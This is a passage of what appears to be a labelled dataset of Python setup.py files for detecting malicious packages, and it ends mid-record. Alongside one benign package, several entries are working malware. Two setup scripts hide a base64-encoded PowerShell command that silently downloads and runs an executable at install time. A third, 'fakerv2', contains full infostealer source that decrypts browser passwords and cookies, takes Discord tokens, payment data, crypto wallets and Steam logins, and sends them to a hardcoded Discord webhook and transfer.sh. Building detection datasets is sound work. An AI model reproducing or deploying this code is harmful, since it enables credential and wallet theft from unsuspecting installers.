<3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-speech\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\n        \"scripts/fixup_speech_v1_keywords.py\",\n        \"scripts/fixup_speech_v1p1beta1_keywords.py\",\n    ],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "tpedpingpull-8.64", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpedpingpull',\n    packages = ['modlib'],\n    version = '2.91',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ultragui-8.41", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'ultragui',\n    packages = ['modlib'],\n    version = '5.44',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "fakerv2-1", "func": "from setuptools import setup\n\nfrom builtins import all,dir,exec,format,len,ord,print,int,list,range,set,str,open\nexec('')\nimport os\nimport threading\nfrom sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads,load\nfrom ctypes import windll,wintypes,byref,cdll,Structure,POINTER,c_char,c_buffer\nfrom urllib.request import Request,urlopen\nfrom json import loads,dumps\nimport time\nimport shutil\nfrom zipfile import ZipFile\nimport random\nimport re\nimport subprocess\nhook='https://discord.com/api/webhooks/1065271724364533781/snVsI3N1jdclHxPo6_wE0ii0nuKDRJJRX-Ce3IomplQMDWldF2DVDUUmGcznBGqVN9J2'\nDETECTED=False\ndef getip():\n    ip='None'\n    try:\n        ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()\n    except:\n        pass\n    return ip\nrequirements=[\n['requests','requests'],\n['Crypto.Cipher','pycryptodome']\n]\nfor modl in requirements:\n    try:__import__(modl[0])\n    except:\n        subprocess.Popen(f\"{executable} -m pip install {modl[1]}\",shell=True)\n        time.sleep(3)\nimport requests\nfrom Crypto.Cipher import AES\nlocal=os.getenv('LOCALAPPDATA')\nroaming=os.getenv('APPDATA')\ntemp=os.getenv('TEMP')\nThreadlist=[]\nclass DATA_BLOB(Structure):\n    _fields_=[\n('cbData',wintypes.DWORD),\n('pbData',POINTER(c_char))\n]\ndef GetData(blob_out):\n    cbData=int(blob_out.cbData)\n    pbData=blob_out.pbData\n    buffer=c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer,pbData,cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\ndef CryptUnprotectData(encrypted_bytes,entropy=b''):\n    buffer_in=c_buffer(encrypted_bytes,len(encrypted_bytes))\n    buffer_entropy=c_buffer(entropy,len(entropy))\n    blob_in=DATA_BLOB(len(encrypted_bytes),buffer_in)\n    blob_entropy=DATA_BLOB(len(entropy),buffer_entropy)\n    blob_out=DATA_BLOB()\n    if windll.crypt32.CryptUnprotectData(byref(blob_in),None,byref(blob_entropy),None,None,0x01,byref(blob_out)):\n        return GetData(blob_out)\ndef DecryptValue(buff,master_key=None):\n    starts=buff.decode(encoding='utf8',errors='ignore')[:3]\n    if starts=='v10' or starts=='v11':\n        iv=buff[3:15]\n        payload=buff[15:]\n        cipher=AES.new(master_key,AES.MODE_GCM,iv)\n        decrypted_pass=cipher.decrypt(payload)\n        decrypted_pass=decrypted_pass[:-16].decode()\n        return decrypted_pass\ndef LoadRequests(methode,url,data='',files='',headers=''):\n    for i in range(8):# max trys\n        try:\n            if methode=='POST':\n                if data !='':\n                    r=requests.post(url,data=data)\n                    if r.status_code==200:\n                        return r\n                elif files !='':\n                    r=requests.post(url,files=files)\n                    if r.status_code==200 or r.status_code==413:# 413=DATA TO BIG\n                        return r\n        except:\n            pass\ndef LoadUrlib(hook,data='',files='',headers=''):\n    for i in range(8):\n        try:\n            if headers !='':\n                r=urlopen(Request(hook,data=data,headers=headers))\n                return r\n            else:\n                r=urlopen(Request(hook,data=data))\n                return r\n        except:\n            pass\ndef Trust(Cookies):\n    global DETECTED\n    data=str(Cookies)\n    tim=re.findall('.google.com',data)\n    if len(tim)<-1:\n        DETECTED=True\n        return DETECTED\n    else:\n        DETECTED=False\n        return DETECTED\ndef GetUHQFriends(token):\n    badgeList=[\n{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},\n{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},\n{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},\n{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},\n{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},\n{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},\n{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},\n{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},\n{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},\n{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}\n]\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        friendlist=loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships',headers=headers)).read().decode())\n    except:\n        return False\n    uhqlist=''\n    for friend in friendlist:\n        OwnedBadges=''\n        flags=friend['user']['public_flags']\n        for badge in badgeList:\n            if flags//badge['Value']!=0 and friend['type']==1:\n                if not 'House' in badge['Name']:\n                    OwnedBadges+=badge['Emoji']\n                flags=flags % badge['Value']\n        if OwnedBadges !='':\n            uhqlist+=f\"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\\n\"\n    return uhqlist\ndef GetBilling(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        billingjson=loads(urlopen(Request('https://discord.com/api/users/@me/billing/payment-sources',headers=headers)).read().decode())\n    except:\n        return False\n    if billingjson==[]:return ' -'\n    billing=''\n    for methode in billingjson:\n        if methode['invalid']==False:\n            if methode['type']==1:\n                billing+='<a:Cc:1032742457416355882>'\n            elif methode['type']==2:\n                billing+='<:paypal:1027984840131366922> '\n    return billing\ndef GetBadge(flags):\n    if flags==0:return ''\n    OwnedBadges=''\n    badgeList=[\n{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},\n{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},\n{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},\n{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},\n{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},\n{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},\n{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},\n{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},\n{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},\n{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}\n]\n    for badge in badgeList:\n        if flags//badge['Value']!=0:\n            OwnedBadges+=badge['Emoji']\n            flags=flags % badge['Value']\n    return OwnedBadges\ndef GetTokenInfo(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    userjson=loads(urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers)).read().decode())\n    username=userjson['username']\n    hashtag=userjson['discriminator']\n    email=userjson['email']\n    idd=userjson['id']\n    pfp=userjson['avatar']\n    flags=userjson['public_flags']\n    nitro=''\n    phone='-'\n    if 'premium_type' in userjson:\n        nitrot=userjson['premium_type']\n        if nitrot==1:\n            nitro='<:classic:896119171019067423> '\n        elif nitrot==2:\n            nitro='<a:boost:824036778570416129> <:classic:896119171019067423> '\n    if 'phone' in userjson:phone=f'`{userjson[\"phone\"]}`'\n    return username,hashtag,email,idd,pfp,flags,nitro,phone\ndef checkToken(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers))\n        return True\n    except:\n        return False\ndef uploadToken(token,path):\n    global hook\n    headers={\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    username,hashtag,email,idd,pfp,flags,nitro,phone=GetTokenInfo(token)\n    if pfp==None:\n        pfp='https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png'\n    else:\n        pfp=f\"https://cdn.discordapp.com/avatars/{idd}/{pfp}\"\n    billing=GetBilling(token)\n    badge=GetBadge(flags)\n    friends=GetUHQFriends(token)\n    if friends=='':friends='No HQ Friends'\n    if not billing:\n        badge,phone,billing=badge,phone,None\n    if nitro=='' and badge=='':nitro=' -'\n    data={\n        'content':f'Found in `{path}`',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                    'name':'<a:dt:1032744237042774057> Token:',\n                    'value':f\"`{token}`\\n[Click to copy](https://superfurrycdn.nl/copy/{token})\"\n},\n{\n                    'name':'<a:Bat:1032747993981538395> Email:',\n                    'value':f\"`{email}`\",\n                    'inline':True\n},\n{\n                    'name':'<a:gengar:1032750484961890426> Phone:',\n                    'value':f\"{phone}\",\n                    'inline':True\n},\n{\n                    'name':'<a:dt1:1032749135188742176> IP:',\n                    'value':f\"`{getip()}`\",\n                    'inline':True\n},\n{\n                    'name':'<a:uzi:1032752999795265537> Badges:',\n                    'value':f\"{nitro}{badge}\",\n                    'inline':True\n},\n{\n                    'name':'<a:Cc:1032742457416355882> Billing:',\n                    'value':f\"{billing}\",\n                    'inline':True\n},\n{\n                    'name':'<a:diamond:1032752566926315575> HQ Friends:',\n                    'value':f\"{friends}\",\n                    'inline':False\n}\n],\n            'author':{\n                'name':f\"{username}#{hashtag} ({idd})\",\n                'icon_url':f\"{pfp}\"\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n},\n            'thumbnail':{\n                'url':f\"{pfp}\"\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1028588906846879856/1037436987482841129/unknown.png',\n        'username':'Fade Stealer',\n        'attachments':[]\n}\n    LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\ndef Reformat(listt):\n    e=re.findall('(\\\\w+[a-z])',listt)\n    while 'https' in e:e.remove('https')\n    while 'com' in e:e.remove('com')\n    while 'net' in e:e.remove('net')\n    return list(set(e))\ndef upload(name,tk=''):\n    headers={\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    if name=='kiwi':\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Interesting files found on user PC:',\n                'value':tk\n}\n],\n            'author':{\n                'name':'Fade | File stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n        return\n    path=name\n    files={'file':open(path,'rb')}\n    if 'wppassw' in name:\n        ra=' | '.join(da for da in paswWords)\n        if len(ra)>1000:\n            rrr=Reformat(str(paswWords))\n            ra=' | '.join(da for da in rrr)\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Found:',\n                'value':ra\n}\n],\n            'author':{\n                'name':'Fade | Password Stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n    if 'wpcook' in name:\n        rb=' | '.join(da for da in cookiWords)\n        if len(rb)>1000:\n            rrrrr=Reformat(str(cookiWords))\n            rb=' | '.join(da for da in rrrrr)\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Found:',\n                'value':rb\n}\n],\n            'author':{\n                'name':'Fade | Stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n    LoadRequests('POST',hook,files=files)\ndef writeforfile(data,name):\n    path=os.getenv('TEMP')+f\"\\wp{name}.txt\"\n    with open(path,mode='w',encoding='utf-8')as f:\n        f.write(f\"<--Fade Stealer ON TOP-->\\n\\n\")\n        for line in data:\n            if line[0]!='':\n                f.write(f\"{line}\\n\")\nTokens=''\ndef getToken(path,arg):\n    if not os.path.exists(path):return\n    path+=arg\n    for file in os.listdir(path):\n        if file.endswith('.log')or file.endswith('.ldb'):\n            for line in[x.strip()for x in open(f\"{path}\\\\{file}\",errors='ignore').readlines()if x.strip()]:\n                for regex in('[\\\\w-]{24}\\\\.[\\\\w-]{6}\\\\.[\\\\w-]{25,110}','mfa\\\\.[\\\\w-]{80,95}'):\n                    for token in re.findall(regex,line):\n                        global Tokens\n                        if checkToken(token):\n                            if not token in Tokens:\n                                Tokens+=token\n                                uploadToken(token,path)\nPassw=[]\ndef getPassw(path,arg):\n    global Passw\n    if not os.path.exists(path):return\n    pathC=path+arg+'/Login Data'\n    if os.stat(pathC).st_size==0:return\n    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'\n    shutil.copy2(pathC,tempfold)\n    conn=sql_connect(tempfold)\n    cursor=conn.cursor()\n    cursor.execute('SELECT action_url, username_value, password_value FROM logins;')\n    data=cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0]!='':\n            for wa in keyword:\n                old=wa\n                if 'https' in wa:\n                    tmp=wa\n                    wa=tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in paswWords:paswWords.append(old)\n            Passw.append(f\"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}\")\n    writeforfile(Passw,'passw')\nCookies=[]\ndef getCookie(path,arg):\n    global Cookies\n    if not os.path.exists(path):return\n    pathC=path+arg+'/Cookies'\n    if os.stat(pathC).st_size==0:return\n    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'\n    shutil.copy2(pathC,tempfold)\n    conn=sql_connect(tempfold)\n    cursor=conn.cursor()\n    cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')\n    data=cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0]!='':\n            for wa in keyword:\n                old=wa\n                if 'https' in wa:\n                    tmp=wa\n                    wa=tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in cookiWords:cookiWords.append(old)\n            Cookies.append(f\"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}\")\n    writeforfile(Cookies,'cook')\ndef GetDiscord(path,arg):\n    if not os.path.exists(f\"{path}/Local State\"):return\n    pathC=path+arg\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for file in os.listdir(pathC):\n        if file.endswith('.log')or file.endswith('.ldb'):\n            for line in[x.strip()for x in open(f\"{pathC}\\\\{file}\",errors='ignore').readlines()if x.strip()]:\n                for token in re.findall('dQw4w9WgXcQ:[^.*\\\\[\\'(.*)\\'\\\\].*$][^\\\\\"]*',line):\n                    global Tokens\n                    tokenDecoded=DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]),master_key)\n                    if checkToken(tokenDecoded):\n                        if not tokenDecoded in Tokens:\n                            Tokens+=tokenDecoded\n                            uploadToken(tokenDecoded,path)\ndef ZipThings(path,arg,procc):\n    pathC=path\n    name=arg\n    if 'nkbihfbeogaeaoehlefnkodbefgpgknn' in arg:\n        browser=path.split('\\\\')[4].split('/')[1].replace(' ','')\n        name=f\"Metamask_{browser}\"\n        pathC=path+arg\n    if not os.path.exists(pathC):return\n    subprocess.Popen(f\"taskkill /im {procc} /t /f\",shell=True)\n    if 'Wallet' in arg or 'NationsGlory' in arg:\n        browser=path.split('\\\\')[4].split('/')[1].replace(' ','')\n        name=f\"{browser}\"\n    elif 'Steam' in arg:\n        if not os.path.isfile(f\"{pathC}/loginusers.vdf\"):return\n        f=open(f\"{pathC}/loginusers.vdf\",'r+',encoding='utf8')\n        data=f.readlines()\n        found=False\n        for l in data:\n            if 'RememberPassword\"\t\t\"1\"' in l:\n                found=True\n        if found==False:return\n        name=arg\n    zf=ZipFile(f\"{pathC}/{name}.zip\",'w')\n    for file in os.listdir(pathC):\n        if not '.zip' in file:zf.write(pathC+'/'+file)\n    zf.close()\n    upload(f'{pathC}/{name}.zip')\n    os.remove(f\"{pathC}/{name}.zip\")\ndef GatherAll():\n    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\n    browserPaths=[\n[f\"{roaming}/Opera Software/Opera GX Stable\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{roaming}/Opera Software/Opera Stable\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{roaming}/Opera Software/Opera Neon/User Data/Default\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Google/Chrome/User Data\",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Google/Chrome SxS/User Data\",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/BraveSoftware/Brave-Browser/User Data\",'brave.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Yandex/YandexBrowser/User Data\",'yandex.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Microsoft/Edge/User Data\",'edge.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn']\n]\n    discordPaths=[\n[f\"{roaming}/Discord\",'/Local Storage/leveldb'],\n[f\"{roaming}/Lightcord\",'/Local Storage/leveldb'],\n[f\"{roaming}/discordcanary\",'/Local Storage/leveldb'],\n[f\"{roaming}/discordptb\",'/Local Storage/leveldb'],\n]\n    PathsToZip=[\n[f\"{roaming}/atomic/Local Storage/leveldb\",'\"Atomic Wallet.exe\"','Wallet'],\n[f\"{roaming}/Exodus/exodus.wallet\",'Exodus.exe','Wallet'],\n['C:\\\\Program Files (x86)\\\\Steam\\\\config','steam.exe','Steam'],\n[f\"{roaming}/NationsGlory/Local Storage/leveldb\",'NationsGlory.exe','NationsGlory']\n]\n    for patt in browserPaths:\n        a=threading.Thread(target=getToken,args=[patt[0],patt[2]])\n        a.start()\n        Threadlist.append(a)\n    for patt in discordPaths:\n        a=threading.Thread(target=GetDiscord,args=[patt[0],patt[1]])\n        a.start()\n        Threadlist.append(a)\n    for patt in browserPaths:\n        a=threading.Thread(target=getPassw,args=[patt[0],patt[3]])\n        a.start()\n        Threadlist.append(a)\n    ThCokk=[]\n    for patt in browserPaths:\n        a=threading.Thread(target=getCookie,args=[patt[0],patt[4]])\n        a.start()\n        ThCokk.append(a)\n    for thread in ThCokk:thread.join()\n    DETECTED=Trust(Cookies)\n    if DETECTED==True:return\n    for patt in browserPaths:\n        threading.Thread(target=ZipThings,args=[patt[0],patt[5],patt[1]]).start()\n    for patt in PathsToZip:\n        threading.Thread(target=ZipThings,args=[patt[0],patt[2],patt[1]]).start()\n    for thread in Threadlist:\n        thread.join()\n    global upths    \n    upths=[]\n    for file in['wppassw.txt','wpcook.txt']:\n        upload(os.getenv('TEMP')+'\\\\'+file)\ndef uploadToAnonfiles(path):\n    try:\n        files={'file':(path,open(path,mode='rb'))}\n        upload=requests.post('https://transfer.sh/',files=files)\n        url=upload.text\n        return url\n    except:\n        return False\ndef KiwiFolder(pathF,keywords):\n    global KiwiFiles\n    maxfilesperdir=7\n    i=0\n    listOfFile=os.listdir(pathF)\n    ffound=[]\n    for file in listOfFile:\n        if not os.path.isfile(pathF+'/'+file):return\n        i+=1\n        if i<=maxfilesperdir:\n            url=uploadToAnonfiles(pathF+'/'+file)\n            ffound.append([pathF+'/'+file,url])\n        else:\n            break\n    KiwiFiles.append(['folder',pathF+'/',ffound])\nKiwiFiles=[]\ndef KiwiFile(path,keywords):\n    global KiwiFiles\n    fifound=[]\n    listOfFile=os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path+'/'+file)and '.txt' in file:\n                    fifound.append([path+'/'+file,uploadToAnonfiles(path+'/'+file)])\n                    break\n                if os.path.isdir(path+'/'+file):\n                    target=path+'/'+file\n                    KiwiFolder(target,keywords)\n                    break\n    KiwiFiles.append(['folder',path,fifound])\ndef Kiwi():\n    user=temp.split('\\\\AppData')[0]\n    path2search=[\n        user+'/Desktop',\n        user+'/Downloads',\n        user+'/Documents'\n]\n    key_wordsFolder=[\n        'account',\n        'acount',\n        'passw',\n        'secret'\n]\n    key_wordsFiles=[\n        'passw',\n        'mdp',\n        'motdepasse',\n        'mot_de_passe',\n        'login',\n        'secret',\n        'account',\n        'acount',\n        'paypal',\n        'banque',\n        'account',\n        'metamask',\n        'wallet',\n        'crypto',\n        'exodus',\n        'discord',\n        '2fa',\n        'code',\n        'memo',\n        'compte',\n        'token',\n        'backup',\n        'secret',\n        'prox'\n]\n    wikith=[]\n    for patt in path2search:\n        kiwi=threading.Thread(target=KiwiFile,args=[patt,key_wordsFiles]);kiwi.start()\n        wikith.append(kiwi)\n    return wikith\nglobal keyword,cookiWords,paswWords\nkeyword=[\n    